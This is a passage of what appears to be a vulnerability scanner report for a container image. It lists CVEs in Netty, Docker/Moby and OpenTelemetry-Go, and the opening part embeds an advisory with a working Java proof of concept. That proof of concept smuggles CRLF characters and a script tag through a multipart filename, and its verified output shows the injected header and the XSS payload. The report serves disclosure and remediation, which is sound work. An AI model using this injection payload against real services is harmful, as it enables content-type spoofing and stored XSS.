│     │      │                           tempFile.deleteOnExit();
│     │      │                           try (FileWriter fw = new FileWriter(tempFile)) {
│     │      │                               fw.write("test content");
│     │      │                           }
│     │      │                           // Malicious filename with CRLF to inject Content-Type header
│     │      │                           String maliciousFilename =
│     │      │                               "innocent.txt\"\r\nContent-Type: text/html\r\nX-Injected:
│     │      │                   true\r\n\r\n" +
│     │      │                               "<script>alert(1)</script>\r\n--";
│     │      │                           HttpRequest request = new DefaultHttpRequest(
│     │      │                               HttpVersion.HTTP_1_1, HttpMethod.POST, "/upload");
│     │      │                           HttpPostRequestEncoder encoder = new HttpPostRequestEncoder(
│     │      │                                   new DefaultHttpDataFactory(false), request, true,
│     │      │                                   StandardCharsets.UTF_8,
│     │      │                   HttpPostRequestEncoder.EncoderMode.RFC3986);
│     │      │                           DiskFileUpload fileUpload = new DiskFileUpload(
│     │      │                                   "file", maliciousFilename, "application/octet-stream",
│     │      │                                   "binary", StandardCharsets.UTF_8, tempFile.length());
│     │      │                           fileUpload.setContent(tempFile);
│     │      │                           encoder.addBodyHttpData(fileUpload);
│     │      │                           encoder.finalizeRequest();
│     │      │                           // Read the encoded multipart body
│     │      │                           StringBuilder body = new StringBuilder();
│     │      │                           while (!encoder.isEndOfInput()) {
│     │      │                               HttpContent chunk = encoder.readChunk(Unpooled.buffer().alloc());
│     │      │                               if (chunk != null) {
│     │      │                                  
│     │      │                   body.append(chunk.content().toString(StandardCharsets.UTF_8));
│     │      │                                   chunk.release();
│     │      │                               }
│     │      │                           encoder.cleanFiles();
│     │      │                           String encoded = body.toString();
│     │      │                           System.out.println("Malicious filename: " +
│     │      │                               maliciousFilename.replace("\r", "\\r").replace("\n", "\\n"));
│     │      │                           System.out.println();
│     │      │                           System.out.println("Encoded multipart body:");
│     │      │                           System.out.println("---");
│     │      │                           for (String line : encoded.split("\n", -1)) {
│     │      │                               System.out.println("  " + line.replace("\r", "\\r"));
│     │      │                           boolean hasInjectedHeader = encoded.contains("X-Injected: true");
│     │      │                           boolean hasInjectedScript = encoded.contains("<script>");
│     │      │                           System.out.println("Injected X-Injected header: " +
│     │      │                   hasInjectedHeader);
│     │      │                           System.out.println("Injected script tag: " + hasInjectedScript);
│     │      │                           System.out.println("VULNERABLE: " +
│     │      │                               ((hasInjectedHeader || hasInjectedScript) ?
│     │      │                                   "YES - MIME header injection!" : "NO"));
│     │      │                           tempFile.delete();
│     │      │                   ### How to Compile and Run
│     │      │                   ```bash
│     │      │                   # Build Netty (skip tests)
│     │      │                   ./mvnw install -pl common,buffer,codec,codec-base,codec-http,transport
│     │      │                   -DskipTests \
│     │      │                     -Dcheckstyle.skip=true -Denforcer.skip=true -Djapicmp.skip=true \
│     │      │                     -Danimal.sniffer.skip=true -Drevapi.skip=true -Dforbiddenapis.skip=true \
│     │      │                     -Dspotbugs.skip=true -q
│     │      │                   # Set classpath
│     │      │                   JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar" -path
│     │      │                   "*/4.2.12.Final/*" \
│     │      │                     | grep -v sources | grep -v javadoc | tr '\n' ':')
│     │      │                   # Compile and run
│     │      │                   javac -cp "$JARS" MultipartFilenameInjectionPoC.java
│     │      │                   java -cp "$JARS:." MultipartFilenameInjectionPoC
│     │      │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
│     │      │                   === Netty Multipart Filename CRLF Injection PoC ===
│     │      │                   [TEST 1] Filename CRLF Injection in Content-Disposition
│     │      │                   -------------------------------------------------------
│     │      │                   Malicious filename: innocent.txt"\r\nContent-Type: text/html\r\nX-Injected:
│     │      │                   true\r\n\r\n<script>alert(1)</script>\r\n--
│     │      │                   Encoded multipart body:
│     │      │                   ---
│     │      │                     --88aaade41dbb9f9f\r
│     │      │                     content-disposition: form-data; name="file"; filename="innocent.txt"\r
│     │      │                     Content-Type: text/html\r                          <-- INJECTED
│     │      │                     X-Injected: true\r                                 <-- INJECTED
│     │      │                     \r
│     │      │                     <script>alert(1)</script>\r                        <-- INJECTED XSS
│     │      │                     --"\r
│     │      │                     content-length: 12\r
│     │      │                     content-type: application/octet-stream\r
│     │      │                     content-transfer-encoding: binary\r
│     │      │                     test content\r
│     │      │                     --88aaade41dbb9f9f--\r
│     │      │                   Injected X-Injected header: true
│     │      │                   Injected script tag: true
│     │      │                   VULNERABLE: YES - MIME header injection!
│     │      │                   === PoC Complete ===
│     │      │                   ## 7. Impact Analysis
│     │      │                   | Impact Category | Description |
│     │      │                   |----------------|-------------|
│     │      │                   | **Confidentiality** | HIGH — Injected headers may bypass access controls or
│     │      │                   leak tokens |
│     │      │                   | **Integrity** | HIGH — Content-Type override enables stored XSS; field name
│     │      │                   injection allows form data manipulation |
│     │      │                   | **Content-Type Spoofing** | Override `application/octet-stream` to
│     │      │                   `text/html` to serve executable content |
│     │      │                   | **Stored XSS** | Inject `<script>` tags via Content-Type override when
│     │      │                   uploaded files are served back |
│     │      │                   | **Form Field Override** | Inject new multipart boundaries to create/override
│     │      │                    form fields |
│     │      │                   | **Downstream Injection** | Custom MIME headers may affect middleware, CDN,
│     │      │                   or storage layer behavior |
│     │      │                   ## 8. Remediation Recommendations
│     │      │                   ### Option 1: Validate in FileUpload.setFilename() (Recommended)
│     │      │                   // DiskFileUpload.java / MemoryFileUpload.java / MixedFileUpload.java
│     │      │                       ObjectUtil.checkNotNull(filename, "filename");
│     │      │                       for (int i = 0; i < filename.length(); i++) {
│     │      │                           char c = filename.charAt(i);
│     │      │                           if (c == '\r' || c == '\n') {
│     │      │                               throw new IllegalArgumentException(
│     │      │                                   "filename contains prohibited CRLF character at index " + i);
│     │      │                       this.filename = filename;
│     │      │                   ### Option 2: Sanitize in HttpPostRequestEncoder (Defense-in-Depth)
│     │      │                   Escape or reject CRLF characters when building Content-Disposition headers:
│     │      │                   // HttpPostRequestEncoder.java - add helper method
│     │      │                   private static String sanitizeHeaderParam(String value) {
│     │      │                       for (int i = 0; i < value.length(); i++) {
│     │      │                           char c = value.charAt(i);
│     │      │                           if (c == '\r' || c == '\n' || c == '"') {
│     │      │                               throw new ErrorDataEncoderException(
│     │      │                                   "Multipart parameter contains prohibited character at index "
│     │      │                   + i);
│     │      │                       return value;
│     │      │                   // Then use in Content-Disposition construction:
│     │      │                   internal.addValue(... + "=\"" + sanitizeHeaderParam(fileUpload.getFilename())
│     │      │                   + "\"\r\n");
│     │      │                   ### Option 3: RFC 2231/5987 Encoding for Filenames
│     │      │                   Use proper RFC 2231 encoding for filenames with special characters:
│     │      │                   // Encode filename per RFC 5987:
│     │      │                   // filename*=UTF-8''encoded%20filename
│     │      │                   String encodedFilename = "UTF-8''" + URLEncoder.encode(filename, "UTF-8");
│     │      │                   internal.addValue(... + "filename*=" + encodedFilename + "\r\n");
│     │      │                   ## 9. References
│     │      │                   - [RFC 2183: Content-Disposition Header
│     │      │                   Field](https://tools.ietf.org/html/rfc2183)
│     │      │                   - [RFC 7578: Returning Values from Forms:
│     │      │                   multipart/form-data](https://tools.ietf.org/html/rfc7578)
│     │      │                   - [RFC 5987: Character Set and Language Encoding for HTTP Header Field
│     │      │                   Parameters](https://tools.ietf.org/html/rfc5987)
│     │      │                   - [CWE-93: Improper Neutralization of CRLF
│     │      │                   Sequences](https://cwe.mitre.org/data/definitions/93.html)
│     │      │                   - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP
│     │      │                   Headers](https://cwe.mitre.org/data/definitions/113.html)
│     │      │                   - [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (same
│     │      │                   pattern)](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v
│     │      │                   86)
│     │      │                   - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection (same
│     │      │                   pattern)](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6j
│     │      │                   x4) 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
│     │      │                         ╰ V3Score : 5.7 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│     │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│     │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHSA-gcjf-9mgh-3p7g 
│     ╰ [12] ╭ VulnerabilityID : CVE-2026-59900 
│            ├ VendorIDs        ─ [0]: GHSA-c69g-56f8-xwqj 
│            ├ PkgName         : io.netty:netty-codec-http2 
│            ├ PkgPath         : openaf/Kube/netty-codec-http2-4.2.15.Final.jar 
│            ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.15.Final 
│            │                  ╰ UID : c30b5fd76294dbfd 
│            ├ InstalledVersion: 4.2.15.Final 
│            ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
│            ├ Status          : fixed 
│            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│            ├ SeveritySource  : ghsa 
│            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59900 
│            ├ DataSource       ╭ ID  : ghsa 
│            │                  ├ Name: GitHub Security Advisory Maven 
│            │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│            ├ Fingerprint     : sha256:5170d84583673134ac6125ea99f961810bcee3e230c7654c997c4126f1fb5593 
│            ├ Title           : Netty: [codec-http2] Lack of Host Header Deduplication in HTTP/2→HTTP/1.x
│            │                   Translation Leads to Request Routing Bypass 
│            ├ Description     : Netty's HTTP/2-to-HTTP/1.x translation layer
│            │                   (`Http2StreamFrameToHttpObjectCodec` and `InboundHttp2ToHttpAdapter`) fails to
│            │                    deduplicate or validate `Host` headers when an HTTP/2 client supplies both
│            │                   the `:authority` pseudo-header and a literal `host` header in a single HEADERS
│            │                    frame. The translator maps `:authority` to `Host` and separately copies the
│            │                   literal `host` header, producing an `HttpRequest` object containing two `Host`
│            │                    headers with attacker-controlled differing values. 
│            ├ Severity        : MEDIUM 
│            ├ VendorSeverity   ─ ghsa: 2 
│            ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/
│            │                         │            SA:N 
│            │                         ╰ V40Score : 6.9 
│            ╰ References       ╭ [0]: https://github.com/netty/netty 
│                               ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│                               ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│                               ╰ [3]: https://github.com/netty/netty/security/advisories/GHSA-c69g-56f8-xwqj 
├ [1] ╭ [0]  ╭ VulnerabilityID : CVE-2026-34040 
│     │      ├ VendorIDs        ─ [0]: GHSA-x744-4wpc-v9h2 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.2%2Bincompatible 
│     │      │                  ╰ UID : 574b64b426d7eeee 
│     │      ├ InstalledVersion: v28.5.2+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:60b9cf8b889157791a28bd5bee51fa175d9893a159e301e48d8b1925fac98797 
│     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows attackers to bypass
│     │      │                   authorization plugins (AuthZ). This issue has been patched in version
│     │      │                   29.3.1. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-288 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 8.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7.8 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-34040 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/plugins_authorization 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/e89edb19ad7de0407a5d31e3111cb01aa10b
│     │      │                  │      5a38 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq 
│     │      │                  ├ [6]: https://github.com/moby/moby/security/advisories/GHSA-x744-4wpc-v9h2 
│     │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-34040 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-34040 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.883Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:38:28.383Z 
│     ├ [1]  ╭ VulnerabilityID : CVE-2026-41567 
│     │      ├ VendorIDs        ─ [0]: GHSA-x86f-5xw2-fm2r 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.2%2Bincompatible 
│     │      │                  ╰ UID : 574b64b426d7eeee 
│     │      ├ InstalledVersion: v28.5.2+incompatible 
│     │      ├ Status          : affected 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41567 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:68bcf22f3de7624116d9a1c93ee08462d7150297fde5745bf75ee64c169b55a6 
│     │      ├ Title           : docker: Moby/Docker Engine: Arbitrary Code Execution via malicious container
│     │      │                   image and compressed archive upload 
│     │      ├ Description     : Moby is an open source container framework. In versions prior to 29.5.1 and in
│     │      │                    moby/moby v2 prior to v2.0.0-beta.14, when a compressed archive is uploaded
│     │      │                   to a container via `PUT /containers/{id}/archive` or piped through `docker cp
│     │      │                   -`, the daemon resolves decompression binaries (such as `xz` or `unpigz`) from
│     │      │                    the container's filesystem rather than the host's due to incorrect ordering
│     │      │                   of operations. A malicious container image containing a trojanized
│     │      │                   decompression binary can achieve arbitrary code execution with full daemon
│     │      │                   privileges, including host root UID and unrestricted capabilities, when a user
│     │      │                    uploads a compressed (xz or gzip) archive into that container. This issue is
│     │      │                   fixed in Docker Engine 29.5.1 and moby/moby v2.0.0-beta.14. Workarounds
│     │      │                   include only running containers from trusted images, using authorization
│     │      │                   plugins to restrict access to the `PUT /containers/{id}/archive` endpoint, and
│     │      │                    avoiding piping compressed archives into containers created from untrusted
│     │      │                   images 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-427 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 7.2 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:42852 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:44622 
│     │      │                  ├ [4] : https://access.redhat.com/security/cve/CVE-2026-41567 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2485356 
│     │      │                  ├ [6] : https://github.com/moby/moby 
│     │      │                  ├ [7] : https://github.com/moby/moby/security/advisories/GHSA-x86f-5xw2-fm2r 
│     │      │                  ├ [8] : https://nvd.nist.gov/vuln/detail/CVE-2026-41567 
│     │      │                  ├ [9] : https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-41567
│     │      │                  │       .json 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-41567 
│     │      ├ PublishedDate   : 2026-06-05T02:17:13.817Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:57.79Z 
│     ├ [2]  ╭ VulnerabilityID : CVE-2026-42306 
│     │      ├ VendorIDs        ─ [0]: GHSA-rg2x-37c3-w2rh 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.2%2Bincompatible 
│     │      │                  ╰ UID : 574b64b426d7eeee 
│     │      ├ InstalledVersion: v28.5.2+incompatible 
│     │      ├ Status          : affected 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42306 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:108fb33c306b113cedf918f47eef352c22eb7151194b9f190c6376a65c6e3948 
│     │      ├ Title           : Moby is an open source container framework. In Docker Engine prior to  ... 
│     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
│     │      │                   29.5.1, Docker Daemon versions 28.5.2 and prior, and Moby Daemon prior to
│     │      │                   version 2.0.0-beta.14, a race condition during docker cp mount setup allows a
│     │      │                   malicious container to redirect a bind mount target to an arbitrary host path,
│     │      │                    potentially overwriting host files or causing denial of service. This issue
│     │      │                   has been patched in Docker Engine version 29.5.1 and Moby Daemon version
│     │      │                   2.0.0-beta.14. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-61 
│     │      │                  ╰ [1]: CWE-367 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ╰ photon: 3 
│     │      ├ CVSS             ╭ ghsa ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:H 
│     │      │                  │      ╰ V3Score : 7.2 
│     │      │                  ╰ nvd  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:H 
│     │      │                         ╰ V3Score : 7.2 
│     │      ├ References       ╭ [0]: https://github.com/moby/moby 
│     │      │                  ├ [1]: https://github.com/moby/moby/security/advisories/GHSA-rg2x-37c3-w2rh 
│     │      │                  ╰ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-42306 
│     │      ├ PublishedDate   : 2026-06-12T19:16:27.49Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:47:39.96Z 
│     ├ [3]  ╭ VulnerabilityID : CVE-2026-33997 
│     │      ├ VendorIDs        ─ [0]: GHSA-pxq6-2prw-chj9 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.2%2Bincompatible 
│     │      │                  ╰ UID : 574b64b426d7eeee 
│     │      ├ InstalledVersion: v28.5.2+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:0948760b36f0029ee5773d7af1ab860b7a0dd4e4ffcaa06cab1a74db9e8a5998 
│     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
│     │      │                   plugin installation 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows plugins privilege
│     │      │                   validation to be bypassed during docker plugin install. Due to an error in the
│     │      │                    daemon's privilege comparison logic, the daemon may incorrectly accept a
│     │      │                   privilege set that differs from the one approved by the user. Plugins that
│     │      │                   request exactly one privilege are also affected, because no comparison is
│     │      │                   performed at all. This issue has been patched in version 29.3.1. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ╭ [0]: CWE-193 
│     │      │                  ╰ [1]: CWE-266 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 6.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 8.1 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:21769 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:22347 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:23345 
│     │      │                  ├ [3] : https://access.redhat.com/security/cve/CVE-2026-33997 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2453277 
│     │      │                  ├ [5] : https://docs.docker.com/engine/extend/legacy_plugins 
│     │      │                  ├ [6] : https://github.com/moby/moby 
│     │      │                  ├ [7] : https://github.com/moby/moby/commit/f4d6f25bf0c3fa12d4968320a4568594775
│     │      │                  │       6a22a 
│     │      │                  ├ [8] : https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [9] : https://github.com/moby/moby/security/advisories/GHSA-pxq6-2prw-chj9 
│     │      │                  ├ [10]: https://nvd.nist.gov/vuln/detail/CVE-2026-33997 
│     │      │                  ├ [11]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33997
│     │      │                  │       .json 
│     │      │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:41.643Z 
│     ├ [4]  ╭ VulnerabilityID : CVE-2026-41568 
│     │      ├ VendorIDs        ─ [0]: GHSA-vp62-88p7-qqf5 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.2%2Bincompatible 
│     │      │                  ╰ UID : 574b64b426d7eeee 
│     │      ├ InstalledVersion: v28.5.2+incompatible 
│     │      ├ Status          : affected 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41568 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:fdb379d37fa29f3f63b1a105c6f20e047854db24d6a9ff27769f7e2c4c9364e4 
│     │      ├ Title           : github.com/docker/docker: github.com/moby/moby: Moby: Denial of Service via
│     │      │                   race condition in docker cp mount setup 
│     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
│     │      │                   29.5.1, Docker Daemon versions 28.5.2 and prior, and Moby Daemon prior to
│     │      │                   version 2.0.0-beta.14, a race condition during docker cp mount setup allows a
│     │      │                   malicious container to create empty files or directories at arbitrary absolute
│     │      │                    paths on the host filesystem. This issue has been patched in Docker Engine
│     │      │                   version 29.5.1 and Moby Daemon version 2.0.0-beta.14. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ╭ [0]: CWE-81 
│     │      │                  ╰ [1]: CWE-367 
│     │      ├ VendorSeverity   ╭ ghsa  : 2 
│     │      │                  ╰ redhat: 1 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:H 
│     │      │                  │        ╰ V3Score : 6 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:L 
│     │      │                           ╰ V3Score : 3.9 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-41568 
│     │      │                  ├ [1]: https://github.com/moby/moby 
│     │      │                  ├ [2]: https://github.com/moby/moby/security/advisories/GHSA-vp62-88p7-qqf5 
│     │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-41568 
│     │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-41568 
│     │      ├ PublishedDate   : 2026-06-12T19:16:26.907Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:46:51.787Z 
│     ├ [5]  ╭ VulnerabilityID : CVE-2026-39883 
│     │      ├ VendorIDs        ─ [0]: GHSA-hfvc-g4fc-pqhx 
│     │      ├ PkgID           : go.opentelemetry.io/otel/sdk@v1.42.0 
│     │      ├ PkgName         : go.opentelemetry.io/otel/sdk 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/go.opentelemetry.io/otel/sdk@v1.42.0 
│     │      │                  ╰ UID : 77f73fc145fb5169 
│     │      ├ InstalledVersion: v1.42.0 
│     │      ├ FixedVersion    : 1.43.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39883 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:24d5d8e5a3ef8ef5bc92214a12aef252a2b310cc26e55acef9d48810060fb283 
│     │      ├ Title           : github.com/open-telemetry/opentelemetry-go: OpenTelemetry-Go: Arbitrary code
│     │      │                   execution via PATH hijacking on BSD/Solaris 
│     │      ├ Description     : OpenTelemetry-Go is the Go implementation of OpenTelemetry. From 1.15.0 to
│     │      │                   1.42.0, the fix for CVE-2026-24051 changed the Darwin ioreg command to use an
│     │      │                   absolute path but left the BSD kenv command using a bare name, allowing the
